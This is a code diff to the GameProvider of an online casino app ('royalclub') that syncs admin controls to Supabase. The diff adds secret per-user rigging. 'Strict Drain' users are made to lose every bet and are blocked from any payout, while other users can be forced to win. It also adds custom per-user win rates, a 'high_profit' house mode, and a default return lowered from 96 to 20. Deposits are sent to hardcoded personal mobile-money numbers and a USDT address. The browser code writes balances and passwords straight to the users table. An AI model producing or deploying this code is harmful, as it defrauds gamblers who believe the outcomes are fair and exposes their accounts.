@@ -243,26 +243,79 @@ export function GameProvider({ children }) {
     return defaults;
   });
 
-  function updateGameControl(newControl) {
+  // Master Cloud Sync: Synchronizes all global admin configurations to Supabase
+  async function syncGlobalSettingsToSupabase(customSettings, customGameControl) {
+    try {
+      const activeS = customSettings || settings || {};
+      const activeG = customGameControl || gameControl || {};
+
+      const payload = {
+        BKASH_NUMBER: activeS.BKASH_NUMBER || "01403398319 (Personal)",
+        NAGAD_NUMBER: activeS.NAGAD_NUMBER || "01403398319 (Personal)",
+        ROCKET_NUMBER: activeS.ROCKET_NUMBER || "01403398319 (Personal)",
+        USDT_DEPOSIT_ADDRESS: activeS.USDT_DEPOSIT_ADDRESS || "TQu8sB7xNkL2mP89qZtV1yWz4AeR6cX4Kd",
+        BKASH_ENABLED: activeS.BKASH_ENABLED !== false,
+        NAGAD_ENABLED: activeS.NAGAD_ENABLED !== false,
+        ROCKET_ENABLED: Boolean(activeS.ROCKET_ENABLED),
+        USDT_ENABLED: activeS.USDT_ENABLED !== false,
+        MIN_DEPOSIT_AMOUNT: Number(activeS.MIN_DEPOSIT_AMOUNT || 100),
+        MIN_WITHDRAWAL_AMOUNT: Number(activeS.MIN_WITHDRAWAL_AMOUNT || 200),
+        DAILY_WITHDRAWAL_LIMIT: Number(activeS.DAILY_WITHDRAWAL_LIMIT || 5000),
+        houseMode: activeG.houseMode || 'high_profit',
+        globalWinRate: Number(activeG.globalWinRate !== undefined ? activeG.globalWinRate : 20),
+        maxMultiplier: Number(activeG.maxMultiplier || 3.5),
+        maxProfitPerRound: Number(activeG.maxProfitPerRound || 150),
+        turnoverMultiplier: Number(activeG.turnoverMultiplier || 2.0),
+        microWinEnabled: activeG.microWinEnabled !== false,
+        aviatorMode: activeG.aviatorMode || 'standard',
+        serverRtp: activeG.serverRtp || {},
+        gameOverrides: activeG.gameOverrides || {},
+        ANNOUNCEMENT_TEXT: activeS.ANNOUNCEMENT_TEXT || ''
+      };
+
+      await supabase.from('game_settings').upsert({
+        game_id: 'global_platform_settings',
+        game_name: 'Global Platform Config',
+        server_provider: JSON.stringify(payload),
+        rtp_percentage: Number(payload.globalWinRate || 20),
+        max_multiplier: Number(payload.maxMultiplier || 3.5),
+        updated_at: new Date().toISOString()
+      }, { onConflict: 'game_id' });
+    } catch (err) {
+      console.warn('Failed to sync global platform settings to Supabase:', err);
+    }
+  }
+
+  async function updateGameControl(newControl) {
+    let nextG;
     setGameControl(prev => {
-      const updated = { ...prev, ...newControl };
-      localStorage.setItem('royalclub_game_control', JSON.stringify(updated));
-      return updated;
+      nextG = { ...prev, ...newControl };
+      try {
+        localStorage.setItem('royalclub_game_control', JSON.stringify(nextG));
+        window.dispatchEvent(new Event('storage'));
+        window.dispatchEvent(new CustomEvent('royalclub_game_control_sync', { detail: nextG }));
+      } catch (e) {}
+      return nextG;
     });
+
+    try {
+      await syncGlobalSettingsToSupabase(settings, nextG);
+    } catch (e) {}
   }
 
   async function updateServerRtp(serverName, rtp) {
     const numRtp = Number(rtp);
+    let nextG;
     setGameControl(prev => {
-      const updated = {
+      nextG = {
         ...prev,
         serverRtp: {
           ...prev.serverRtp,
           [serverName]: numRtp
         }
       };
-      localStorage.setItem('royalclub_game_control', JSON.stringify(updated));
-      return updated;
+      localStorage.setItem('royalclub_game_control', JSON.stringify(nextG));
+      return nextG;
     });
 
     try {
@@ -270,15 +323,17 @@ export function GameProvider({ children }) {
         rtp_percentage: numRtp,
         updated_at: new Date().toISOString()
       }).eq('server_provider', serverName);
+      await syncGlobalSettingsToSupabase(settings, nextG);
     } catch (e) {
       console.warn('Supabase server RTP sync notice:', e);
     }
   }
 
-  function updateGameOverride(gameId, updates) {
+  async function updateGameOverride(gameId, updates) {
+    let nextG;
     setGameControl(prev => {
       const mergedUpdates = { ...updates };
-      const updated = {
+      nextG = {
         ...prev,
         gameOverrides: {
           ...prev.gameOverrides,
@@ -288,20 +343,80 @@ export function GameProvider({ children }) {
           }
         }
       };
-      localStorage.setItem('royalclub_game_control', JSON.stringify(updated));
-      return updated;
+      localStorage.setItem('royalclub_game_control', JSON.stringify(nextG));
+      return nextG;
     });
+
+    try {
+      await syncGlobalSettingsToSupabase(settings, nextG);
+    } catch (e) {}
   }
 
-  function updateUserLuckMode(targetUid, luckMode) {
-    setAllUsers(prev => prev.map(u => (u.uid === targetUid || u.id === targetUid) ? { ...u, luck_mode: luckMode } : u));
-    setUser(prev => (prev.uid === targetUid || prev.id === targetUid) ? { ...prev, luck_mode: luckMode } : prev);
+  // Targeted User Luck & Rigging Control (Persisted live to Supabase users table)
+  async function updateUserLuckMode(targetUid, luckMode, customWinRate) {
+    const forceResult = luckMode === 'drain' ? 'force_lose' : luckMode === 'sweetener' ? 'force_win' : 'normal';
+    const winRate = customWinRate !== undefined && !isNaN(Number(customWinRate)) 
+      ? Number(customWinRate) 
+      : (luckMode === 'drain' ? 5 : luckMode === 'sweetener' ? 40 : 20);
+
+    const patch = {
+      luck_mode: luckMode,
+      force_result: forceResult,
+      custom_win_rate: winRate
+    };
+
+    setAllUsers(prev => prev.map(u => (u.uid === targetUid || u.id === targetUid) ? { ...u, ...patch } : u));
+    setUser(prev => (prev.uid === targetUid || prev.id === targetUid) ? { ...prev, ...patch } : prev);
+
+    const savedCurrent = localStorage.getItem('royalclub_current_user');
+    if (savedCurrent) {
+      try {
+        const parsed = JSON.parse(savedCurrent);
+        if (parsed.uid === targetUid || parsed.id === targetUid) {
+          localStorage.setItem('royalclub_current_user', JSON.stringify({ ...parsed, ...patch }));
+        }
+      } catch (e) {}
+    }
+
+    try {
+      const targetUser = allUsers.find(u => u.uid === targetUid || u.id === targetUid);
+      if (targetUser) {
+        const supaPayload = { force_result: forceResult, custom_win_rate: winRate };
+        if (targetUser.id) await supabase.from('users').update(supaPayload).eq('id', targetUser.id);
+        else if (targetUser.phone) await supabase.from('users').update(supaPayload).eq('phone', targetUser.phone);
+        else if (targetUser.username) await supabase.from('users').update(supaPayload).eq('username', targetUser.username);
+      }
+    } catch (e) {
+      console.warn('updateUserLuckMode Supabase sync notice:', e);
+    }
   }
 
-  function updateUserDirectBalance(uid, newBalance) {
+  // Targeted Direct User Balance Update (Persisted live to Supabase users table)
+  async function updateUserDirectBalance(uid, newBalance) {
     const bal = Math.max(0, parseFloat(parseFloat(newBalance).toFixed(2)));
-    setAllUsers(prev => prev.map(u => u.uid === uid ? { ...u, balance: bal } : u));
-    setUser(prev => prev.uid === uid ? { ...prev, balance: bal } : prev);
+    setAllUsers(prev => prev.map(u => (u.uid === uid || u.id === uid) ? { ...u, balance: bal } : u));
+    setUser(prev => (prev.uid === uid || prev.id === uid) ? { ...prev, balance: bal } : prev);
+
+    const savedCurrent = localStorage.getItem('royalclub_current_user');
+    if (savedCurrent) {
+      try {
+        const parsed = JSON.parse(savedCurrent);
+        if (parsed.uid === uid || parsed.id === uid) {
+          localStorage.setItem('royalclub_current_user', JSON.stringify({ ...parsed, balance: bal }));
+        }
+      } catch (e) {}
+    }
+
+    try {
+      const targetUser = allUsers.find(u => u.uid === uid || u.id === uid);
+      if (targetUser) {
+        if (targetUser.id) await supabase.from('users').update({ balance: bal }).eq('id', targetUser.id);
+        else if (targetUser.phone) await supabase.from('users').update({ balance: bal }).eq('phone', targetUser.phone);
+        else if (targetUser.username) await supabase.from('users').update({ balance: bal }).eq('username', targetUser.username);
+      }
+    } catch (e) {
+      console.warn('updateUserDirectBalance Supabase sync notice:', e);
+    }
   }
 
   function updateSignupBonusAmount(amount) {
@@ -355,14 +470,39 @@ export function GameProvider({ children }) {
       maxAllowedMult = Number(override.maxMultiplier);
     }
 
-    // Check user luck mode & turnover
+    // Check target user luck mode, force_result & turnover
     const currentUser = user || {};
-    const userInList = allUsers.find(u => u.uid === currentUser.uid || u.username === currentUser.username);
+    const userInList = allUsers.find(u => (u.uid && u.uid === currentUser.uid) || (u.id && u.id === currentUser.id) || (u.username && u.username === currentUser.username));
+    const forceResult = userInList?.force_result || currentUser?.force_result || 'normal';
     const luckMode = userInList?.luck_mode || currentUser?.luck_mode || 'controlled';
+    const targetedWinRate = userInList?.custom_win_rate !== undefined ? userInList.custom_win_rate : currentUser?.custom_win_rate;
 
-    if (luckMode === 'drain') {
-      baseWinRate = Math.min(baseWinRate, 8);
-      maxAllowedMult = 1.5;
+    // TARGET CONTROL 1: STRICT DRAIN / GUARANTEED LOSS (100% loss)
+    if (forceResult === 'force_lose' || luckMode === 'drain') {
+      return {
+        won: false,
+        multiplier: 0,
+        payout: 0,
+        isMicroWin: false,
+        message: 'Strict Drain'
+      };
+    }
+
+    // TARGET CONTROL 2: GUARANTEED WIN (Sweetener)
+    if (forceResult === 'force_win') {
+      const sweetMult = 1.35;
+      return {
+        won: true,
+        multiplier: sweetMult,
+        payout: parseFloat((bAmt * sweetMult).toFixed(2)),
+        isMicroWin: false,
+        message: 'Sweetener Win'
+      };
+    }
+
+    // TARGET CONTROL 3: CUSTOM WIN RATE OVERRIDE (e.g. 5%, 10%, 15%, 50%)
+    if (targetedWinRate !== undefined && !isNaN(Number(targetedWinRate)) && Number(targetedWinRate) > 0 && Number(targetedWinRate) <= 100) {
+      baseWinRate = Number(targetedWinRate);
     } else if (luckMode === 'sweetener') {
       baseWinRate = Math.max(baseWinRate, 35);
     }
@@ -427,6 +567,15 @@ export function GameProvider({ children }) {
     const bAmt = Math.max(0.1, Number(betAmount) || 10);
     let payout = Math.max(0, parseFloat(proposedPayout) || 0);
     if (payout <= 0) return 0;
+
+    // TARGET CONTROL: Strict Drain users can NEVER receive a payout
+    const currentUser = user || {};
+    const userInList = allUsers.find(u => (u.uid && u.uid === currentUser.uid) || (u.id && u.id === currentUser.id) || (u.username && u.username === currentUser.username));
+    const forceResult = userInList?.force_result || currentUser?.force_result || 'normal';
+    const luckMode = userInList?.luck_mode || currentUser?.luck_mode || 'controlled';
+    if (forceResult === 'force_lose' || luckMode === 'drain') {
+      return 0;
+    }
 
     const override = gameControl?.gameOverrides?.[gameId] || {};
     const maxMult = override.maxMultiplier || gameControl?.maxMultiplier || 3.5;
@@ -922,8 +1071,8 @@ export function GameProvider({ children }) {
     });
   }
 
-  // 3J. Profile Edit & Password Change Operations
-  function editUserProfile(uid, updates) {
+  // 3J. Profile Edit & Password Change Operations (Live Supabase Sync)
+  async function editUserProfile(uid, updates) {
     setAllUsers(prev => prev.map(u => (u.uid === uid || u.id === uid) ? { ...u, ...updates } : u));
     setUser(prev => (prev.uid === uid || prev.id === uid) ? { ...prev, ...updates } : prev);
     
@@ -931,7 +1080,7 @@ export function GameProvider({ children }) {
     if (savedCurrent) {
       try {
         const parsed = JSON.parse(savedCurrent);
-        if (parsed.uid === uid) {
+        if (parsed.uid === uid || parsed.id === uid) {
           localStorage.setItem('royalclub_current_user', JSON.stringify({ ...parsed, ...updates }));
         }
       } catch (e) {}
@@ -939,10 +1088,21 @@ export function GameProvider({ children }) {
 
     try {
       const targetUser = allUsers.find(u => u.uid === uid || u.id === uid);
-      if (targetUser && targetUser.username) {
-        supabase.from('users').update(updates).eq('username', targetUser.username).then(() => {}).catch(() => {});
+      if (targetUser) {
+        const allowedCols = ['vip_level', 'password', 'custom_win_rate', 'force_result', 'balance', 'is_online'];
+        const supaPayload = {};
+        for (const [k, v] of Object.entries(updates)) {
+          if (allowedCols.includes(k)) supaPayload[k] = v;
+        }
+        if (Object.keys(supaPayload).length > 0) {
+          if (targetUser.id) await supabase.from('users').update(supaPayload).eq('id', targetUser.id);
+          else if (targetUser.phone) await supabase.from('users').update(supaPayload).eq('phone', targetUser.phone);
+          else if (targetUser.username) await supabase.from('users').update(supaPayload).eq('username', targetUser.username);
+        }
       }
-    } catch (e) {}
+    } catch (e) {
+      console.warn('editUserProfile Supabase update notice:', e);
+    }
   }
 
   function adminResetPassword(uid, newPassword) {
@@ -1103,18 +1263,61 @@ export function GameProvider({ children }) {
           setSupabaseStatus('connected');
         }
 
-        // 2. Fetch game settings from Supabase game_settings table (Syncs live across all devices)
+        // 2. Fetch game settings and GLOBAL PLATFORM SETTINGS from Supabase game_settings table (Syncs live across all devices)
         const { data: supaSettings, error: sErr } = await supabase.from('game_settings').select('*');
         if (!sErr && supaSettings && supaSettings.length > 0) {
+          // Check for global platform config
+          const globalRow = supaSettings.find(s => s.game_id === 'global_platform_settings');
+          if (globalRow && globalRow.server_provider) {
+            try {
+              const parsed = JSON.parse(globalRow.server_provider);
+              setSettings(prev => {
+                const merged = {
+                  ...prev,
+                  BKASH_NUMBER: parsed.BKASH_NUMBER || prev.BKASH_NUMBER,
+                  NAGAD_NUMBER: parsed.NAGAD_NUMBER || prev.NAGAD_NUMBER,
+                  ROCKET_NUMBER: parsed.ROCKET_NUMBER || prev.ROCKET_NUMBER,
+                  USDT_DEPOSIT_ADDRESS: parsed.USDT_DEPOSIT_ADDRESS || prev.USDT_DEPOSIT_ADDRESS,
+                  BKASH_ENABLED: parsed.BKASH_ENABLED !== false,
+                  NAGAD_ENABLED: parsed.NAGAD_ENABLED !== false,
+                  ROCKET_ENABLED: Boolean(parsed.ROCKET_ENABLED),
+                  USDT_ENABLED: parsed.USDT_ENABLED !== false,
+                  MIN_DEPOSIT_AMOUNT: Number(parsed.MIN_DEPOSIT_AMOUNT || prev.MIN_DEPOSIT_AMOUNT),
+                  MIN_WITHDRAWAL_AMOUNT: Number(parsed.MIN_WITHDRAWAL_AMOUNT || prev.MIN_WITHDRAWAL_AMOUNT),
+                  DAILY_WITHDRAWAL_LIMIT: Number(parsed.DAILY_WITHDRAWAL_LIMIT || prev.DAILY_WITHDRAWAL_LIMIT),
+                  ANNOUNCEMENT_TEXT: parsed.ANNOUNCEMENT_TEXT || prev.ANNOUNCEMENT_TEXT
+                };
+                try { localStorage.setItem('royalclub_settings', JSON.stringify(merged)); } catch (e) {}
+                return merged;
+              });
+
+              setGameControl(prev => {
+                const mergedG = {
+                  ...prev,
+                  houseMode: parsed.houseMode || prev.houseMode,
+                  globalWinRate: Number(parsed.globalWinRate !== undefined ? parsed.globalWinRate : prev.globalWinRate),
+                  maxMultiplier: Number(parsed.maxMultiplier || prev.maxMultiplier),
+                  maxProfitPerRound: Number(parsed.maxProfitPerRound || prev.maxProfitPerRound),
+                  turnoverMultiplier: Number(parsed.turnoverMultiplier || prev.turnoverMultiplier),
+                  microWinEnabled: (parsed.microWinEnabled !== undefined) ? parsed.microWinEnabled : prev.microWinEnabled,
+                  aviatorMode: parsed.aviatorMode || prev.aviatorMode,
+                  serverRtp: { ...prev.serverRtp, ...(parsed.serverRtp || {}) }
+                };
+                try { localStorage.setItem('royalclub_game_control', JSON.stringify(mergedG)); } catch (e) {}
+                return mergedG;
+              });
+            } catch (err) {}
+          }
+
           setGameControl(prev => {
             const nextOverrides = { ...(prev.gameOverrides || {}) };
             supaSettings.forEach(s => {
-              if (s.game_id) {
-                const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 96);
+              if (s.game_id && s.game_id !== 'global_platform_settings') {
+                const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 20);
                 nextOverrides[s.game_id] = {
                   winRate: rtp,
                   rtp: rtp,
-                  maxMultiplier: Number(s.max_multiplier || 100),
+                  maxMultiplier: Number(s.max_multiplier || 3.5),
                   gameName: s.game_name
                 };
               }
@@ -1147,20 +1350,55 @@ export function GameProvider({ children }) {
 
     initSupabaseData();
 
-    // Real-time continuous sync of game settings across all connected players
+    // Real-time continuous sync of platform settings, global controls, and targeted users
     const syncInterval = setInterval(async () => {
       try {
+        // A. Sync game_settings & global_platform_settings
         const { data: supaSettings } = await supabase.from('game_settings').select('*');
         if (supaSettings && supaSettings.length > 0) {
+          const globalRow = supaSettings.find(s => s.game_id === 'global_platform_settings');
+          if (globalRow && globalRow.server_provider) {
+            try {
+              const parsed = JSON.parse(globalRow.server_provider);
+              setSettings(prev => ({
+                ...prev,
+                BKASH_NUMBER: parsed.BKASH_NUMBER || prev.BKASH_NUMBER,
+                NAGAD_NUMBER: parsed.NAGAD_NUMBER || prev.NAGAD_NUMBER,
+                ROCKET_NUMBER: parsed.ROCKET_NUMBER || prev.ROCKET_NUMBER,
+                USDT_DEPOSIT_ADDRESS: parsed.USDT_DEPOSIT_ADDRESS || prev.USDT_DEPOSIT_ADDRESS,
+                BKASH_ENABLED: parsed.BKASH_ENABLED !== false,
+                NAGAD_ENABLED: parsed.NAGAD_ENABLED !== false,
+                ROCKET_ENABLED: Boolean(parsed.ROCKET_ENABLED),
+                USDT_ENABLED: parsed.USDT_ENABLED !== false,
+                MIN_DEPOSIT_AMOUNT: Number(parsed.MIN_DEPOSIT_AMOUNT || prev.MIN_DEPOSIT_AMOUNT),
+                MIN_WITHDRAWAL_AMOUNT: Number(parsed.MIN_WITHDRAWAL_AMOUNT || prev.MIN_WITHDRAWAL_AMOUNT),
+                DAILY_WITHDRAWAL_LIMIT: Number(parsed.DAILY_WITHDRAWAL_LIMIT || prev.DAILY_WITHDRAWAL_LIMIT),
+                ANNOUNCEMENT_TEXT: parsed.ANNOUNCEMENT_TEXT || prev.ANNOUNCEMENT_TEXT
+              }));
+
+              setGameControl(prev => ({
+                ...prev,
+                houseMode: parsed.houseMode || prev.houseMode,
+                globalWinRate: Number(parsed.globalWinRate !== undefined ? parsed.globalWinRate : prev.globalWinRate),
+                maxMultiplier: Number(parsed.maxMultiplier || prev.maxMultiplier),
+                maxProfitPerRound: Number(parsed.maxProfitPerRound || prev.maxProfitPerRound),
+                turnoverMultiplier: Number(parsed.turnoverMultiplier || prev.turnoverMultiplier),
+                microWinEnabled: (parsed.microWinEnabled !== undefined) ? parsed.microWinEnabled : prev.microWinEnabled,
+                aviatorMode: parsed.aviatorMode || prev.aviatorMode,
+                serverRtp: { ...prev.serverRtp, ...(parsed.serverRtp || {}) }
+              }));
+            } catch (pe) {}
+          }
+
           setGameControl(prev => {
             const nextOverrides = { ...(prev.gameOverrides || {}) };
             supaSettings.forEach(s => {
-              if (s.game_id) {
-                const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 96);
+              if (s.game_id && s.game_id !== 'global_platform_settings') {
+                const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 20);
                 nextOverrides[s.game_id] = {
                   winRate: rtp,
                   rtp: rtp,
-                  maxMultiplier: Number(s.max_multiplier || 100),
+                  maxMultiplier: Number(s.max_multiplier || 3.5),
                   gameName: s.game_name
                 };
               }
@@ -1168,8 +1406,41 @@ export function GameProvider({ children }) {
             return { ...prev, gameOverrides: nextOverrides };
           });
         }
+
+        // B. Sync users table (for targeted user win rates, force loss, balance adjustments)
+        const { data: supaUsers } = await supabase.from('users').select('*');
+        if (supaUsers && supaUsers.length > 0) {
+          setAllUsers(supaUsers);
+          const savedCurrent = localStorage.getItem('royalclub_current_user');
+          if (savedCurrent) {
+            try {
+              const parsed = JSON.parse(savedCurrent);
+              if (parsed.username && parsed.username !== 'Guest' && !parsed.is_guest) {
+                const match = supaUsers.find(u => 
+                  (u.username && parsed.username && u.username.toLowerCase() === parsed.username.toLowerCase()) ||
+                  (u.phone && parsed.phone && u.phone === parsed.phone) ||
+                  (u.uid && parsed.uid && u.uid === parsed.uid)
+                );
+                if (match) {
+                  setUser(prev => {
+                    const updated = {
+                      ...prev,
+                      balance: Number(match.balance !== undefined ? match.balance : prev.balance),
+                      vip_level: Number(match.vip_level !== undefined ? match.vip_level : prev.vip_level),
+                      custom_win_rate: Number(match.custom_win_rate !== undefined ? match.custom_win_rate : prev.custom_win_rate),
+                      force_result: match.force_result || prev.force_result,
+                      luck_mode: match.force_result === 'force_lose' ? 'drain' : match.force_result === 'force_win' ? 'sweetener' : prev.luck_mode
+                    };
+                    try { localStorage.setItem('royalclub_current_user', JSON.stringify(updated)); } catch (e) {}
+                    return updated;
+                  });
+                }
+              }
+            } catch (e) {}
+          }
+        }
       } catch (e) {}
-    }, 5000);
+    }, 6000);
 
     return () => {
       clearInterval(syncInterval);
@@ -1178,18 +1449,52 @@ export function GameProvider({ children }) {
 
   async function refreshSupabaseData() {
     try {
-      // 1. Fetch game settings for all users
+      // 1. Fetch game settings and global platform configuration for all users
       const { data: supaSettings } = await supabase.from('game_settings').select('*');
       if (supaSettings && supaSettings.length > 0) {
+        const globalRow = supaSettings.find(s => s.game_id === 'global_platform_settings');
+        if (globalRow && globalRow.server_provider) {
+          try {
+            const parsed = JSON.parse(globalRow.server_provider);
+            setSettings(prev => ({
+              ...prev,
+              BKASH_NUMBER: parsed.BKASH_NUMBER || prev.BKASH_NUMBER,
+              NAGAD_NUMBER: parsed.NAGAD_NUMBER || prev.NAGAD_NUMBER,
+              ROCKET_NUMBER: parsed.ROCKET_NUMBER || prev.ROCKET_NUMBER,
+              USDT_DEPOSIT_ADDRESS: parsed.USDT_DEPOSIT_ADDRESS || prev.USDT_DEPOSIT_ADDRESS,
+              BKASH_ENABLED: parsed.BKASH_ENABLED !== false,
+              NAGAD_ENABLED: parsed.NAGAD_ENABLED !== false,
+              ROCKET_ENABLED: Boolean(parsed.ROCKET_ENABLED),
+              USDT_ENABLED: parsed.USDT_ENABLED !== false,
+              MIN_DEPOSIT_AMOUNT: Number(parsed.MIN_DEPOSIT_AMOUNT || prev.MIN_DEPOSIT_AMOUNT),
+              MIN_WITHDRAWAL_AMOUNT: Number(parsed.MIN_WITHDRAWAL_AMOUNT || prev.MIN_WITHDRAWAL_AMOUNT),
+              DAILY_WITHDRAWAL_LIMIT: Number(parsed.DAILY_WITHDRAWAL_LIMIT || prev.DAILY_WITHDRAWAL_LIMIT),
+              ANNOUNCEMENT_TEXT: parsed.ANNOUNCEMENT_TEXT || prev.ANNOUNCEMENT_TEXT
+            }));
+
+            setGameControl(prev => ({
+              ...prev,
+              houseMode: parsed.houseMode || prev.houseMode,
+              globalWinRate: Number(parsed.globalWinRate !== undefined ? parsed.globalWinRate : prev.globalWinRate),
+              maxMultiplier: Number(parsed.maxMultiplier || prev.maxMultiplier),
+              maxProfitPerRound: Number(parsed.maxProfitPerRound || prev.maxProfitPerRound),
+              turnoverMultiplier: Number(parsed.turnoverMultiplier || prev.turnoverMultiplier),
+              microWinEnabled: (parsed.microWinEnabled !== undefined) ? parsed.microWinEnabled : prev.microWinEnabled,
+              aviatorMode: parsed.aviatorMode || prev.aviatorMode,
+              serverRtp: { ...prev.serverRtp, ...(parsed.serverRtp || {}) }
+            }));
+          } catch (pe) {}
+        }
+
         setGameControl(prev => {
           const nextOverrides = { ...(prev.gameOverrides || {}) };
           supaSettings.forEach(s => {
-            if (s.game_id) {
-              const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 96);
+            if (s.game_id && s.game_id !== 'global_platform_settings') {
+              const rtp = Number(s.rtp_percentage !== undefined && s.rtp_percentage !== null ? s.rtp_percentage : 20);
               nextOverrides[s.game_id] = {
                 winRate: rtp,
                 rtp: rtp,
-                maxMultiplier: Number(s.max_multiplier || 100),
+                maxMultiplier: Number(s.max_multiplier || 3.5),
                 gameName: s.game_name
               };
             }
